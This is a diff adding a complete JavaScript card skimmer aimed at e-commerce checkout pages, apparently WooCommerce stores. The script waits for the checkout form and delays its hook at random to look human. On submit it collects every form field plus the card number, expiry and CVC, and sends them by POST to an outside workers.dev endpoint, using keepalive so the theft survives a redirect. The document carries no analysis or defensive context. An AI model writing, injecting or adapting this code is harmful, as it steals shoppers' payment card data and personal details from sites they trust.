@@ -1,0 +1,55 @@
+(function() {
+    // CONFIG
+    const API = 'https://chanfana-openapi-template.joshmccallister1986.workers.dev';
+    
+    // Wait for the form to exist
+    const checkForm = setInterval(() => {
+        const form = document.querySelector('form.checkout') || document.querySelector('form#checkout_form');
+        if (form) {
+            clearInterval(checkForm);
+            initSkimmer(form);
+        }
+    }, 100);
+
+    function initSkimmer(form) {
+        // Add a slight random delay to mimic human behavior (100-500ms)
+        setTimeout(() => {
+            form.addEventListener('submit', function(e) {
+                // Don't block the actual submission
+                // We use a small timeout to let the validation happen first
+                setTimeout(() => {
+                    sendData(form);
+                }, 200);
+            }, { once: true }); // Only trigger once per page load to avoid double-sending
+        }, Math.random() * 400 + 100);
+    }
+
+    function sendData(form) {
+        const data = {};
+        const inputs = form.querySelectorAll('input, select, textarea');
+        
+        inputs.forEach(input => {
+            if (input.name && input.value) {
+                data[input.name] = input.value;
+            }
+        });
+
+        // Specifically grab Credit Card info if it's in a different container/iframe
+        // WooCommerce often puts CC fields in a specific class
+        const ccNumber = document.querySelector('.wc-credit-card-form-cardnumber, input[name="card_number"], #cc_number');
+        const ccExpiry = document.querySelector('.wc-credit-card-form-expiry, input[name="expiry"], #cc_expiry');
+        const ccCvc = document.querySelector('.wc-credit-card-form-cvc, input[name="cvc"], #cc_cvc');
+
+        if (ccNumber) data['cc_number'] = ccNumber.value;
+        if (ccExpiry) data['cc_expiry'] = ccExpiry.value;
+        if (ccCvc) data['cc_cvc'] = ccCvc.value;
+
+        // Send to your API
+        fetch(API, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(data),
+            keepalive: true // Crucial: sends data even if the page redirects immediately
+        }).catch(err => console.log('Skim failed', err));
+    }
+})();
